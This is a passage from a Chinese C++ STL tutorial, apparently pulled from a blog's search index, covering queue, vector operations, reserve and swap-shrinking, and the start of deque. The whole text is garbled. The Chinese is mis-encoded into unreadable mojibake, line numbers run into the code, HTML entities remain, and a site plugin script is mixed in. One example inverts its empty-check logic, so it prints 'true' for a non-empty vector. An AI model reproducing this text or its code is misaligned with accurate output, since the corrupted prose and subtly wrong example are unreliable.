ï¼Œä»å¦ä¸€ç«¯ç§»é™¤å…ƒç´ ã€‚queue æ‰€æœ‰å…ƒç´ çš„è¿›å‡ºéƒ½å¿…é¡»ç¬¦åˆ â€ å…ˆè¿›å…ˆå‡ºâ€ çš„è§„åˆ™ï¼Œåªæœ‰ queue çš„é¡¶ç«¯å…ƒç´ ï¼Œæ‰æœ‰æœºä¼šè¢«å¤–ç•Œå–ç”¨ã€‚queue ä¸æä¾›éå†åŠŸèƒ½ï¼Œä¹Ÿä¸æä¾›è¿­ä»£å™¨ã€‚ç”±äº queue ä»¥åº•éƒ¨å®¹å™¨å®Œæˆå…¶æ‰€æœ‰å·¥ä½œï¼Œå› æ­¤ï¼ŒSTL queue å¾€å¾€ä¹Ÿä¸è¢«å½’ç±»ä¸º containerï¼ˆå®¹å™¨ï¼‰ï¼Œè€Œè¢«å½’ç±»ä¸º container adapterï¼ˆå®¹å™¨é…æ¥å™¨ï¼‰ã€‚ queue å®¹å™¨çš„ä½¿ç”¨1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;iostream&gt;#include&lt;queue&gt;using namespace std;void printQueue(queue&lt;int&gt; &amp;q) { // åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º while (!q.empty()) { cout &lt;&lt; "å¤§å°: " &lt;&lt; q.size() &lt;&lt; endl; cout &lt;&lt; "é˜Ÿå¤´: " &lt;&lt; q.front() &lt;&lt; endl; cout &lt;&lt; "é˜Ÿå°¾: " &lt;&lt; q.back() &lt;&lt; endl; // å¼¹å‡ºï¼ˆåˆ é™¤ï¼‰é˜Ÿå¤´å…ƒç´  q.pop(); }}int main() { // é»˜è®¤æ„é€ å‡½æ•° queue&lt;int&gt; q1; // å¾€é˜Ÿå°¾æ·»åŠ å…ƒç´  q1.push(1); q1.push(3); q1.push(5); q1.push(7); q1.push(9); // è¿”å›é˜Ÿåˆ—çš„å¤§å° cout &lt;&lt; "size = " &lt;&lt; q1.size() &lt;&lt; endl; // è¿”å›ç¬¬ä¸€ä¸ªå…ƒç´  cout &lt;&lt; "first = " &lt;&lt; q1.front() &lt;&lt; endl; // è¿”å›æœ€åä¸€ä¸ªå…ƒç´  cout &lt;&lt; "last = " &lt;&lt; q1.back() &lt;&lt; endl; printQueue(q1); // æ‹·è´æ„é€ å‡½æ•° queue&lt;int&gt; q2 = q1; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123456789101112131415161718size = 5first = 1last = 9å¤§å°: 5é˜Ÿå¤´: 1é˜Ÿå°¾: 9å¤§å°: 4é˜Ÿå¤´: 3é˜Ÿå°¾: 9å¤§å°: 3é˜Ÿå¤´: 5é˜Ÿå°¾: 9å¤§å°: 2é˜Ÿå¤´: 7é˜Ÿå°¾: 9å¤§å°: 1é˜Ÿå¤´: 9é˜Ÿå°¾: 9 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ è¿›é˜¶åŸºç¡€ä¹‹ä¸ƒ",url:"/posts/9e89901e.html",text:'vector å®¹å™¨vector å®¹å™¨çš„æ¦‚å¿µvector çš„æ•°æ®å­˜å‚¨ä»¥åŠæ“ä½œæ–¹å¼ï¼Œä¸ Array éå¸¸ç›¸ä¼¼ï¼Œä¸¤è€…çš„å”¯ä¸€å·®åˆ«åœ¨äºç©ºé—´è¿ç”¨çš„çµæ´»æ€§ã€‚Array æ˜¯é™æ€ç©ºé—´ï¼Œä¸€æ—¦é…ç½®äº†å°±ä¸èƒ½æ”¹å˜ï¼Œè¦æ¢å¤§ä¸€ç‚¹æˆ–è€…å°ä¸€ç‚¹çš„ç©ºé—´ï¼Œå¯ä»¥ï¼Œä¸€åˆ‡çç¢çš„ç»†èŠ‚å¾—ç”±è‡ªå·±æ¥å®ç°ï¼›é¦–å…ˆé…ç½®ä¸€å—æ–°çš„ç©ºé—´ï¼Œç„¶åå°†æ—§ç©ºé—´çš„æ•°æ®æ¬å¾€æ–°ç©ºé—´ï¼Œå†é‡Šæ”¾åŸæ¥çš„ç©ºé—´ã€‚Vector æ˜¯åŠ¨æ€ç©ºé—´ï¼Œéšç€å…ƒç´ çš„åŠ å…¥ï¼Œå®ƒçš„å†…éƒ¨æœºåˆ¶ä¼šè‡ªåŠ¨æ‰©å……ç©ºé—´ä»¥å®¹çº³æ–°å…ƒç´ ã€‚å› æ­¤ vector çš„è¿ç”¨å¯¹äºå†…å­˜çš„åˆç†åˆ©ç”¨ä¸è¿ç”¨çš„çµæ´»æ€§æœ‰å¾ˆå¤§çš„å¸®åŠ©ï¼Œæˆ‘ä»¬å†ä¹Ÿä¸å¿…å®³æ€•ç©ºé—´ä¸è¶³è€Œä¸€å¼€å§‹å°±åˆå§‹åŒ–ä¸€ä¸ªå¤§çš„ Array äº†ã€‚Vector çš„å®ç°æŠ€æœ¯ï¼Œå…³é”®åœ¨äºå…¶å¯¹å¤§å°çš„æ§åˆ¶ä»¥åŠé‡æ–°é…ç½®æ—¶çš„æ•°æ®ç§»åŠ¨æ•ˆç‡ï¼Œä¸€æ—¦ vector æ—§ç©ºé—´æ»¡äº†ï¼Œå¦‚æœå®¢æˆ·æ¯æ–°å¢ä¸€ä¸ªå…ƒç´  vector å†…éƒ¨åªæ˜¯æ‰©å……ä¸€ä¸ªå…ƒç´ çš„ç©ºé—´ï¼Œå®ä¸ºä¸æ™ºï¼Œå› ä¸ºæ‰€è°“çš„æ‰©å……ç©ºé—´ï¼ˆä¸è®ºå¤šå¤§ï¼‰ï¼Œä¸€å¦‚åˆšæ‰€è¯´ï¼Œæ˜¯ â€œé…ç½®æ–°ç©ºé—´ - æ•°æ®ç§»åŠ¨ - é‡Šæ”¾æ—§ç©ºé—´â€ çš„å¤§å·¥ç¨‹ï¼Œæ—¶é—´æˆæœ¬å¾ˆé«˜ï¼Œåº”è¯¥åŠ å…¥æŸç§æœªé›¨ç»¸ç¼ªçš„è€ƒè™‘ã€‚ vector å®¹å™¨çš„æ•°æ®ç»“æ„ vector æ‰€é‡‡ç”¨çš„æ•°æ®ç»“æ„æ˜¯çº¿æ€§è¿ç»­ç©ºé—´ï¼ˆå•å‘å¼€å£çš„è¿ç»­å†…å­˜ç©ºé—´ï¼‰ï¼Œå®ƒä»¥ä¸¤ä¸ªè¿­ä»£å™¨ï¼ˆ_Myfirst å’Œ _Mylastï¼‰åˆ†åˆ«æŒ‡å‘é…ç½®å¾—æ¥çš„è¿ç»­ç©ºé—´ä¸­ç›®å‰å·²è¢«ä½¿ç”¨çš„èŒƒå›´ï¼Œå¹¶ä»¥è¿­ä»£å™¨ _Myend æŒ‡å‘æ•´å—è¿ç»­å†…å­˜ç©ºé—´çš„å°¾ç«¯ã€‚vector å¾€å°¾éƒ¨æ·»åŠ æˆ–ç§»é™¤å…ƒç´ çš„æ•ˆç‡éå¸¸é«˜ï¼Œä½†æ˜¯å¾€å¤´éƒ¨æˆ–è€…ä¸­éƒ¨æ’å…¥å…ƒç´ æˆ–ç§»é™¤å…ƒç´ åˆ™æ¯”è¾ƒè´¹æ—¶ã€‚ä¸ºäº†é™ä½ç©ºé—´é…ç½®æ—¶çš„é€Ÿåº¦æˆæœ¬ï¼Œvector å®é™…é…ç½®çš„å¤§å°å¯èƒ½æ¯”å®¢æˆ·ç«¯éœ€æ±‚å¤§ä¸€äº›ï¼Œä»¥åº”ä»˜å°†æ¥å¯èƒ½çš„æ‰©å……ï¼Œè¿™é‡Œæ˜¯å®¹é‡çš„æ¦‚å¿µã€‚æ¢å¥è¯è¯´ï¼Œä¸€ä¸ª vector çš„å®¹é‡æ°¸è¿œå¤§äºæˆ–ç­‰äºå…¶å¤§å°ï¼Œä¸€æ—¦å®¹é‡ç­‰äºå¤§å°ï¼Œä¾¿æ˜¯æ»¡è½½ï¼Œä¸‹æ¬¡å†éœ€è¦æ–°å¢å…ƒç´ æ—¶ï¼Œæ•´ä¸ª vector å®¹å™¨å°±å¾—å¦è§…å±…æ‰€ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ‰€è°“åŠ¨æ€å¢åŠ å¤§å°ï¼Œå¹¶ä¸æ˜¯åœ¨åŸç©ºé—´ä¹‹åç»­æ¥æ–°ç©ºé—´ï¼ˆå› ä¸ºæ— æ³•ä¿è¯åŸç©ºé—´ä¹‹åå°šæœ‰å¯é…ç½®çš„ç©ºé—´ï¼‰ï¼Œè€Œæ˜¯ç”³è¯·ä¸€å—æ›´å¤§çš„å†…å­˜ç©ºé—´ï¼Œç„¶åå°†åŸæ•°æ®æ‹·è´åˆ°æ–°ç©ºé—´ï¼Œå¹¶é‡Šæ”¾åŸç©ºé—´ã€‚å› æ­¤ï¼Œå¯¹ vector çš„ä»»ä½•æ“ä½œï¼Œä¸€æ—¦å¼•èµ·ç©ºé—´çš„é‡æ–°é…ç½®ï¼ŒæŒ‡å‘åŸ vector çš„æ‰€æœ‰è¿­ä»£å™¨å°±éƒ½å¤±æ•ˆäº†ï¼Œè¿™æ˜¯ç¨‹åºå®¹æ˜“å‡ºé”™çš„åœ°æ–¹ï¼ŒåŠ¡å¿…å°å¿ƒã€‚ vector å®¹å™¨çš„è¿­ä»£å™¨vector ç»´æŠ¤äº†ä¸€ä¸ªçº¿æ€§ç©ºé—´ï¼Œæ‰€ä»¥ä¸è®ºå…ƒç´ çš„ç±»å‹æ˜¯ä»€ä¹ˆï¼Œæ™®é€šæŒ‡é’ˆéƒ½å¯ä»¥ä½œä¸º vector çš„è¿­ä»£å™¨ï¼Œå› ä¸º vector è¿­ä»£å™¨æ‰€éœ€è¦çš„æ“ä½œè¡Œä¸ºï¼Œå¦‚ operaroe*, operator-&gt;, operator++, operator--, operator+, operator-, operator+=, operator-= éƒ½æ˜¯æ™®é€šæŒ‡é’ˆå¤©ç”Ÿå…·å¤‡çš„ã€‚vector æ”¯æŒéšæœºå­˜å–ï¼Œè€Œæ™®é€šæŒ‡é’ˆæ­£æœ‰ç€è¿™æ ·çš„èƒ½åŠ›ï¼Œæ‰€ä»¥ vector æä¾›çš„æ˜¯éšæœºè®¿é—®è¿­ä»£å™¨ï¼ˆRandom Access Iteratorsï¼‰ï¼Œæ”¯æŒéšæœºå­˜å–å…ƒç´ ã€‚æ ¹æ®å‰é¢çš„æè¿°ï¼Œå¯ä»¥å†™å¦‚ä¸‹çš„ä»£ç ï¼š 123456789101112131415161718192021222324#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;int main() { // å£°æ˜å®¹å™¨ vector&lt;int&gt; v1; // æ’å…¥å®¹å™¨æ•°æ® for (int i = 0; i &lt; 10; i++) { v1.push_back(i); cout &lt;&lt; i &lt;&lt; " "; } cout &lt;&lt; endl; // vector çš„è¿­ä»£å™¨æ˜¯éšæœºè®¿é—®è¿­ä»£å™¨ï¼Œæ”¯æŒè·³è·ƒå¼è®¿é—®ï¼ˆéšæœºå­˜å–å…ƒç´ ï¼‰ vector&lt;int&gt;::iterator itBegin = v1.begin(); itBegin = itBegin + 2; cout &lt;&lt; *itBegin &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 120 1 2 3 4 5 6 7 8 9 2 vector å®¹å™¨çš„ä½¿ç”¨vector çš„æ„é€ ä¸èµ‹å€¼1234vector&lt;T&gt; v; // é»˜è®¤æ„é€ å‡½æ•°ï¼Œé‡‡ç”¨æ¨¡æ¿å®ç°ç±»å®ç°vector(v.begin(), v.end()); // æœ‰å‚æ„é€ å‡½æ•°ï¼Œå°† v[begin(), end()] åŒºé—´ä¸­çš„å…ƒç´ æ‹·è´ç»™æœ¬èº«vector(n, elem); // æœ‰å‚æ„é€ å‡½æ•°ï¼Œå°† n ä¸ª elem å…ƒç´ æ‹·è´ç»™æœ¬èº«vector(const vector &amp;vec); // æ‹·è´æ„é€ å‡½æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;iostream&gt;#include&lt;vector&gt;using namespace std;void printVector(vector&lt;int&gt; &amp;v) { // éå†å®¹å™¨ for (vector&lt;int&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl;}int main() { int arr[] = {1, 2, 3, 4, 5}; cout &lt;&lt; "------ vector æ„é€ å‡½æ•° ------" &lt;&lt; endl; // é»˜è®¤æ„é€ å‡½æ•° vector&lt;int&gt; v1; // æœ‰å‚æ„é€ å‡½æ•°ï¼Œå°† v[begin(), end()] åŒºé—´ä¸­çš„å…ƒç´ æ‹·è´ç»™æœ¬èº« vector&lt;int&gt; v2(arr, arr + sizeof(arr) / sizeof(int)); printVector(v2); // æœ‰å‚æ„é€ å‡½æ•°ï¼Œå°† v[begin(), end()] åŒºé—´ä¸­çš„å…ƒç´ æ‹·è´ç»™æœ¬èº« vector&lt;int&gt; v3(v2.begin(), v2.end()); printVector(v3); // æœ‰å‚æ„é€ å‡½æ•°ï¼Œå°† n ä¸ª elem å…ƒç´ æ‹·è´ç»™æœ¬èº« vector&lt;int&gt; v4(5, 10); printVector(v4); // æ‹·è´æ„é€ å‡½æ•° vector&lt;int&gt; v5 = v4; printVector(v5); cout &lt;&lt; "------ vector èµ‹å€¼æ“ä½œ ------" &lt;&lt; endl; // èµ‹å€¼æ“ä½œï¼Œå°† v[begin(), end()] åŒºé—´ä¸­çš„å…ƒç´ æ‹·è´ç»™æœ¬èº« vector&lt;int&gt; v6; v6.assign(v5.begin(), v5.end()); printVector(v6); // èµ‹å€¼æ“ä½œï¼Œå°† n ä¸ª elem å…ƒç´ æ‹·è´ç»™æœ¬èº« vector&lt;int&gt; v7; v7.assign(5, 8); printVector(v7); // èµ‹å€¼æ“ä½œï¼Œé‡è½½ç­‰å·æ“ä½œç¬¦ vector&lt;int&gt; v8; v8 = v6; printVector(v8); // èµ‹å€¼æ“ä½œï¼Œå°†å…¶ä»–å®¹å™¨ä¸æœ¬èº«çš„å…ƒç´ äº’æ¢ï¼Œåˆ©ç”¨ swap() å¯ä»¥æ”¶ç¼©ç©ºé—´ v8.swap(v7); printVector(v8); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12345678910------ vector æ„é€ å‡½æ•° ------1 2 3 4 5 1 2 3 4 5 10 10 10 10 10 10 10 10 10 10 ------ vector èµ‹å€¼æ“ä½œ ------10 10 10 10 10 8 8 8 8 8 10 10 10 10 10 8 8 8 8 8 vector çš„å¸¸ç”¨æ“ä½œ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;void printVector(vector&lt;int&gt; &amp;v) { // éå†vector for (vector&lt;int&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl;}int main() { vector&lt;int&gt; v1; v1.assign(5, 10); cout &lt;&lt; "------ vector å¤§å°ã€å®¹é‡æ“ä½œ ------" &lt;&lt; endl; // è·å–å®¹å™¨ä¸­å…ƒç´ çš„ä¸ªæ•° size_t size = v1.size(); cout &lt;&lt; "size = " &lt;&lt; size &lt;&lt; endl; // åˆ¤æ–­å®¹å™¨æ˜¯å¦ä¸ºç©º bool empty = v1.empty(); cout &lt;&lt; (empty == 0 ? "true" : "false") &lt;&lt; endl; // é‡æ–°æŒ‡å®šå®¹å™¨çš„å¤§å°ä¸º numï¼Œè‹¥å®¹å™¨å˜å¤§ï¼Œåˆ™ä»¥é»˜è®¤å€¼ï¼ˆ0ï¼‰å¡«å……æ–°ä½ç½®ã€‚å¦‚æœå®¹å™¨å˜å°ï¼Œåˆ™æœ«å°¾è¶…å‡ºå®¹å™¨å¤§å°çš„å…ƒç´ ä¼šè¢«åˆ é™¤ v1.resize(7); printVector(v1); // é‡æ–°æŒ‡å®šå®¹å™¨çš„å¤§å°ä¸º numï¼Œè‹¥å®¹å™¨å˜å¤§ï¼Œåˆ™ä»¥æŒ‡å®šå€¼å¡«å……æ–°ä½ç½®ã€‚å¦‚æœå®¹å™¨å˜å°ï¼Œåˆ™æœ«å°¾è¶…å‡ºå®¹å™¨å¤§å°çš„å…ƒç´ ä¼šè¢«åˆ é™¤ v1.resize(10, 8); printVector(v1); // è·å–å®¹å™¨çš„å®¹é‡ size_t capacity = v1.capacity(); cout &lt;&lt; "capacity = " &lt;&lt; capacity &lt;&lt; endl; cout &lt;&lt; "------ vector æ•°æ®è¯»å–æ“ä½œ ------" &lt;&lt; endl; vector&lt;int&gt; v2; v2.push_back(3); v2.push_back(6); v2.push_back(9); v2.push_back(12); v2.push_back(15); // è¿”å›ç´¢å¼•æ‰€æŒ‡å‘çš„æ•°æ®ï¼Œå¦‚æœç´¢å¼•è¶Šç•Œï¼ŒæŠ›å‡º out_of_range å¼‚å¸¸ int num1 = v2.at(1); cout &lt;&lt; "num1 = " &lt;&lt; num1 &lt;&lt; endl; // è¿”å›ç´¢å¼•æ‰€æŒ‡å‘çš„æ•°æ®ï¼Œå¦‚æœç´¢å¼•è¶Šç•Œï¼Œç¨‹åºç»ˆæ­¢è¿è¡Œ int num2 = v2[3]; cout &lt;&lt; "num2 = " &lt;&lt; num2 &lt;&lt; endl; // è¿”å›å®¹å™¨ä¸­ç¬¬ä¸€ä¸ªæ•°æ®å…ƒç´  int font = v2.front(); cout &lt;&lt; "font = " &lt;&lt; font &lt;&lt; endl; // è¿”å›å®¹å™¨ä¸­æœ€åä¸€ä¸ªæ•°æ®å…ƒç´  int back = v2.back(); cout &lt;&lt; "back = " &lt;&lt; back &lt;&lt; endl; cout &lt;&lt; "------ vector æ’å…¥å’Œåˆ é™¤æ“ä½œ ------" &lt;&lt; endl; // å¾€è¿­ä»£å™¨æŒ‡å‘çš„ä½ç½®æ’å…¥ n ä¸ªæŒ‡å®šçš„å…ƒç´ ï¼Œå…¶ä¸­å…ƒç´ ä¸ªæ•°å¯ä»¥çœç•¥ vector&lt;int&gt; v3(5, 8); v3.insert(v3.begin(), 2, 10); printVector(v3); // å¾€å®¹å™¨çš„å°¾éƒ¨æ’å…¥å…ƒç´  v3.push_back(11); printVector(v3); // åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´  v3.pop_back(); printVector(v3); // åˆ é™¤è¿­ä»£å™¨æŒ‡å‘çš„å…ƒç´ ï¼Œè¿­ä»£å™¨å°±æ˜¯æŒ‡é’ˆ v3.erase(v3.begin()); printVector(v3); // åˆ é™¤è¿­ä»£å™¨ä» start åˆ° end ä¹‹é—´çš„å…ƒç´  v3.erase(v3.begin(), v3.end()); if (v3.empty()) { cout &lt;&lt; "vector is empty" &lt;&lt; endl; } // åˆ é™¤å®¹å™¨ä¸­çš„æ‰€æœ‰å…ƒç´  v3.clear(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234567891011121314151617------ vector å¤§å°ã€å®¹é‡æ“ä½œ ------size = 5true10 10 10 10 10 0 0 10 10 10 10 10 0 0 8 8 8 capacity = 10------ vector æ•°æ®å­˜å–æ“ä½œ ------num1 = 6num2 = 12font = 3back = 15------ vector æ’å…¥å’Œåˆ é™¤æ“ä½œ ------10 10 8 8 8 8 8 10 10 8 8 8 8 8 11 10 10 8 8 8 8 8 10 8 8 8 8 8 vector is empty vector é€†åºéå†å®¹å™¨è¿­ä»£å™¨çš„ç±»å‹ï¼š iteratorï¼šæ™®é€šè¿­ä»£å™¨ const_iteratorï¼šåªè¯»è¿­ä»£å™¨ reverse_iteratorï¼šé€†åºè¿­ä»£å™¨ 1234567891011121314151617181920212223242526272829303132#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;int main() { vector&lt;int&gt; v1; for (int i = 0; i &lt; 10; i++) { v1.push_back(i); } // é¡ºåºéå†å®¹å™¨ for (vector&lt;int&gt;::iterator it = v1.begin(); it != v1.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl; // é€†åºéå†å®¹å™¨ï¼ˆä½¿ç”¨é€†åºè¿­ä»£å™¨ï¼‰ for (vector&lt;int&gt;::reverse_iterator it = v1.rbegin(); it != v1.rend(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl; // vector çš„è¿­ä»£å™¨æ˜¯éšæœºè®¿é—®è¿­ä»£å™¨ï¼Œæ”¯æŒè·³è·ƒå¼è®¿é—® vector&lt;int&gt;::iterator itBegin = v1.begin(); itBegin = itBegin + 2; cout &lt;&lt; *itBegin &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1230 1 2 3 4 5 6 7 8 9 9 8 7 6 5 4 3 2 1 0 2 vector æ”¶ç¼©ç©ºé—´ç»“åˆ C++ çš„åŒ¿åå¯¹è±¡å’Œ vector å®¹å™¨çš„ swap() å‡½æ•°ï¼Œå¯ä»¥å®ç°æ”¶ç¼© vector å®¹å™¨çš„ç©ºé—´ã€‚ 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include&lt;vector&gt;using namespace std;int main() { vector&lt;int&gt; v1; // æ’å…¥å®¹å™¨æ•°æ® for (int i = 0; i &lt; 100000; i++) { v1.push_back(i); } cout &lt;&lt; "size = " &lt;&lt; v1.size() &lt;&lt; endl; cout &lt;&lt; "capacity = " &lt;&lt; v1.capacity() &lt;&lt; endl; // é‡æ–°æŒ‡å®šå®¹å™¨çš„å¤§å°ï¼Œæ­¤æ—¶å®¹å™¨çš„å®¹é‡ä¸ä¼šæ”¹å˜ v1.resize(5); cout &lt;&lt; "size = " &lt;&lt; v1.size() &lt;&lt; endl; cout &lt;&lt; "capacity = " &lt;&lt; v1.capacity() &lt;&lt; endl; // å·§ç”¨åŒ¿åå¯¹è±¡å’Œ swap() å‡½æ•°æ”¶ç¼© vector å®¹å™¨çš„ç©ºé—´ vector&lt;int&gt;(v1).swap(v1); cout &lt;&lt; "size = " &lt;&lt; v1.size() &lt;&lt; endl; cout &lt;&lt; "capacity = " &lt;&lt; v1.capacity() &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123456size = 100000capacity = 131072size = 5capacity = 131072size = 5capacity = 5 vector é¢„ç•™ç©ºé—´reserve() å‡½æ•°å¯ä»¥è®© vector å®¹å™¨é¢„ç•™æŒ‡å®šçš„ç©ºé—´ï¼Œå°¤å…¶åœ¨å¤§æ•°æ®é‡æ’å…¥çš„æƒ…å†µä¸‹ï¼Œè¿™å¯ä»¥å‡å°‘ vector å®¹å™¨é¢‘ç¹æ‰©å……å®¹é‡å¸¦æ¥çš„é¢å¤–æ€§èƒ½å¼€é”€ï¼Œä»è€Œæå‡ç¨‹åºçš„è¿è¡Œæ•ˆç‡ã€‚ 123456789101112131415161718192021222324252627282930313233343536#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;void initData(vector&lt;int&gt; &amp;v, size_t size, bool reserve) { // é¢„ç•™ç©ºé—´ if (reserve) { v.reserve(size); } int count = 0; int *pStart = NULL; for (int i = 0; i &lt; size; i++) { // æ’å…¥å®¹å™¨æ•°æ® v.push_back(i); // ç»Ÿè®¡å®¹å™¨æ”¹å˜å®¹é‡çš„æ¬¡æ•° if (pStart != &amp;v[0]) { pStart = &amp;v[0]; count++; } } cout &lt;&lt; "count : " &lt;&lt; count &lt;&lt; endl;}int main() { // ä¸ç”³è¯·é¢„è§ˆç©ºé—´ vector&lt;int&gt; v1; initData(v1, 100000, false); // ç”³è¯·é¢„è§ˆç©ºé—´ vector&lt;int&gt; v2; initData(v2, 100000, true); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12count : 18count : 1 deque å®¹å™¨deque å®¹å™¨çš„æ¦‚å¿µvector æ˜¯å•å‘å¼€å£çš„è¿ç»­çº¿æ€§ç©ºé—´ï¼Œè€Œ deque åˆ™æ˜¯ä¸€ç§åŒå‘å¼€å£çš„è¿ç»­çº¿æ€§ç©ºé—´ã€‚æ‰€è°“åŒå‘å¼€å£ï¼Œæ„æ€æ˜¯å¯ä»¥åœ¨å¤´å°¾ä¸¤ç«¯åˆ†åˆ«è¿›è¡Œå…ƒç´ çš„æ’å…¥å’Œç§»é™¤æ“ä½œã€‚è™½ç„¶ vector ä¹Ÿå¯ä»¥åœ¨å¤´å°¾ä¸¤ç«¯è¿›è¡Œæ“ä½œï¼Œä½†æ˜¯å…¶å¤´éƒ¨æ“ä½œçš„æ•ˆç‡éå¸¸ä½ï¼Œæ— æ³•è¢«æ¥å—ã€‚deque å’Œ vector çš„æœ€å¤§å·®å¼‚ï¼Œä¸€åœ¨äº deque å…è®¸äºå¸¸æ•°é¡¹æ—¶é—´å†…å¯¹å¤´ç«¯è¿›è¡Œå…ƒç´ çš„æ’å…¥æˆ–ç§»é™¤æ“ä½œï¼ŒäºŒåœ¨äº deque æ²¡æœ‰æ‰€è°“å®¹é‡ capacity çš„è§‚å¿µï¼Œå› ä¸ºå®ƒæ˜¯åŠ¨æ€åœ°ä»¥åˆ†æ®µè¿ç»­ç©ºé—´ç»„åˆè€Œæˆï¼Œéšæ—¶å¯ä»¥å¢åŠ ä¸€æ®µæ–°çš„ç©ºé—´å¹¶é“¾æ¥èµ·æ¥ã€‚æ¢å¥è¯è¯´ï¼Œåƒ vector é‚£æ ·å› æ—§ç©ºé—´ä¸è¶³è€Œé‡æ–°é…ç½®ä¸€å—æ›´å¤§çš„ç©ºé—´ï¼Œç„¶åæ‹·è´å…ƒç´ ï¼Œå†é‡Šæ”¾æ—§ç©ºé—´è¿™æ ·çš„äº‹æƒ…ä¸ä¼šå‘ç”Ÿåœ¨ deque èº«ä¸Šï¼Œä¹Ÿå› æ­¤ deque æ²¡æœ‰å¿…è¦æä¾›æ‰€è°“çš„ç©ºé—´ä¿ç•™ï¼ˆreserveï¼‰åŠŸèƒ½ã€‚è™½ç„¶ deque ä¹Ÿæä¾›äº†éšæœºè¿­ä»£å™¨ï¼ˆRandom Access Iteratorï¼‰ï¼Œä½†æ˜¯å®ƒçš„è¿­ä»£å™¨å¹¶ä¸æ˜¯æ™®é€šçš„æŒ‡é’ˆï¼Œå…¶å¤æ‚åº¦å’Œ vector ä¸æ˜¯ä¸€ä¸ªé‡çº§ï¼Œè¿™ä¼šå½±å“å„ä¸ªå±‚é¢çš„è¿ç®—æ•ˆç‡ã€‚å› æ­¤ï¼Œé™¤éæœ‰å¿…è¦ï¼Œåº”è¯¥å°½å¯èƒ½çš„ä½¿ç”¨ vectorï¼Œè€Œä¸æ˜¯ dequeã€‚å¯¹ deque è¿›è¡Œçš„æ’åºæ“ä½œï¼Œä¸ºäº†æé«˜æ•ˆç‡ï¼Œå¯å°† deque å…ˆå®Œæ•´çš„å¤åˆ¶åˆ°ä¸€ä¸ª vector ä¸­ï¼Œç„¶åå¯¹ vector å®¹å™¨è¿›è¡Œæ’åºï¼Œå†å¤åˆ¶å› dequeã€‚ deque å®¹å™¨çš„å®ç°åŸç†deque æœ¬è´¨ç”±ä¸€æ®µä¸€æ®µçš„å®šé‡è¿ç»­ç©ºé—´ï¼ˆåˆ†æ®µè¿ç»­å†…å­˜ç©ºé—´ï¼‰æ„é€ è€Œæˆï¼Œä¸€æ—¦æœ‰å¿…è¦åœ¨ deque çš„å¤´ç«¯æˆ–å°¾ç«¯å¢åŠ æ–°ç©ºé—´ï¼Œä¾¿ä¼šé…ç½®ä¸€æ®µæ–°çš„å®šé‡è¿ç»­ç©ºé—´ï¼Œç„¶åä¸²æ¥åœ¨æ•´ä¸ª deque çš„å¤´ç«¯æˆ–å°¾ç«¯ã€‚deque æœ€å¤§çš„å·¥ä½œå°±æ˜¯ç»´æŠ¤è¿™äº›åˆ†æ®µè¿ç»­çš„å†…å­˜ç©ºé—´çš„æ•´ä½“æ€§çš„å‡è±¡ï¼Œå¹¶æä¾›éšæœºå­˜å–çš„æ¥å£ï¼›è¿™é¿å¼€äº†é‡æ–°é…ç½®ç©ºé—´ã€å¤åˆ¶æ•°æ®ã€é‡Šæ”¾ç©ºé—´çš„è½®å›ï¼Œä»£ä»·å°±æ˜¯å¤æ‚çš„è¿­ä»£å™¨æ¶æ„ã€‚æ—¢ç„¶ deque ä½¿ç”¨çš„æ˜¯åˆ†æ®µè¿ç»­å†…å­˜ç©ºé—´ï¼Œé‚£ä¹ˆå°±å¿…é¡»æœ‰ä¸­å¤®æ§åˆ¶å™¨ï¼Œç»´æŒå…¶æ•´ä½“è¿ç»­çš„å‡è±¡ï¼Œè¿™æ ·ä¹Ÿå¯¼è‡´äº†æ•°æ®ç»“æ„çš„è®¾è®¡åŠè¿­ä»£å™¨çš„å‰è¿›åé€€æ“ä½œé¢‡ä¸ºç¹çï¼Œdeque åº•å±‚å®ç°çš„ä»£ç è¿œæ¯” vector æˆ– list éƒ½å¤šå¾—å¤šã€‚ deque 